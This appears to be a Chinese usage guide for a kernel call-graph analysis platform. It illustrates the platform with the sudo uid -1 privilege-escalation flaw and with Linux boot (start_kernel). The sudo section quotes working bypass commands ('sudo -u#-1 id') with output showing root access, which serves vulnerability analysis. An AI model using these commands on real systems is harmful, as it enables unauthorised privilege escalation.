# 例子

## sudo漏洞

### 漏洞内容

在特定配置环境下，非特权用户通过将sudo将自身uid设置为-1或4294967295时，可绕过配置的限制条件，以sudo用户权限执行。

详细内容如下：

> 首先添加一个系统帐号 test_sudo 作为实验所用
> 然后用 root 身份在 /etc/sudoers 中增加：
>
> test_sudo ALL=(ALL,!root) /usr/bin/id
>
> 表示允许 test_sudo 帐号以非 root 外的身份执行 /usr/bin/id，如果试图以 root 帐号运行 id 命令则会被拒绝：
>
> [test_sudo@localhost ~] $ sudo id
> 对不起，用户 test_sudo 无权以 root 的身份在 localhost.localdomain 上执行 /bin/id。
>
> sudo -u 也可以通过指定 UID 的方式来代替用户，当指定的 UID 为 -1 或 4294967295（-1 的补码，其实内部是按无符号整数处理的） 时，因此可以触发漏洞，绕过上面的限制并以 root 身份执行命令：
>
> [test_sudo@localhost ~]$ sudo -u#-1 id
> uid=0(root) gid=1004(test_sudo) 组=1004(test_sudo) 环境=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
> [test_sudo@localhost ~]$ sudo -u#4294967295 id
> uid=0(root) gid=1004(test_sudo) 组=1004(test_sudo) 环境=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
>
> <https://paper.seebug.org/1057/>

### 分析平台辅助

通过 strace 跟踪 命令执行时的系统调用:

```sh
[root@localhost ~]# strace -u test_sudo sudo -u#-1 id
```

输出的系统调用中,出现多个设置用户id系统调用,以setresuid为例:

```c
setresuid(-1, -1, -1)                   = 0
```

sudo 内部调用了 setresuid 来提升权限（虽然还调用了其他设置组之类的函数，但先不做分析），并且传入的参数都是 -1。

由动态跟踪的内容,确定要分析的函数为 setresuid():

在函数调用图中将setresuid()函数设置为源路径,查看其调用内容:

![调用图](https://raw.githubusercontent.com/sx807/img-url-personal/master/img_20200512171120.png)

能够明确看出,函数内调用kernel与security模块中函数,右键边查看函数调用列表:

![表1](https://raw.githubusercontent.com/sx807/img-url-personal/master/img_20200512171607.png)

![表2](https://raw.githubusercontent.com/sx807/img-url-personal/master/img_20200512171642.png)

通过节点右键菜单可以查看源码:

![右键](https://raw.githubusercontent.com/sx807/img-url-personal/master/img_20200512182406.png)

![源码](https://raw.githubusercontent.com/sx807/img-url-personal/master/img_20200512182512.png)

函数调用列表与源码中一致

通过调用图的筛选边和展开节点功能,能够快速帮助研究人员找到当前函数所关联模块

![展开+筛选](https://raw.githubusercontent.com/sx807/img-url-personal/master/img_20200512185521.png)

## Linux启动

> <https://blog.csdn.net/perfect1t/article/details/81741531>

通过链接脚本和汇编文件确定内核引导阶段后，会进入 start_kernel 函数，进行初始化。

确定函数所在文件为 /init/Main.c，打开分析平台，选择内核版本和平台，将源路径选为Main.c，目标路径选为/，能够查看调用图，使用调用图筛选和拖动等功能，可以实现更好的查看效果：

![内核启动](https://raw.githubusercontent.com/sx807/img-url-personal/master/img_20200513112809.png)

对于需要分析的模块，可以通过节点展开、查看函数调用表等方式获取详细信息。如，查看 start_kernel 种对 fs 模块的调用表：

![fs调用表](https://raw.githubusercontent.com/sx807/img-url-personal/master/img_20200513124421.png)

结合源码行号查看，可以辅助研究者分析模块间调用关系，快速确定源码中函数所在位置及模块间调用关系。

平台提供了，调用图到源码、调用图到调用列表、调用列表到源码的跳转关系，使用者从整体模块间调用开始，查看模块间调用函数，到查看调用行代码，逐步细化分析内容。
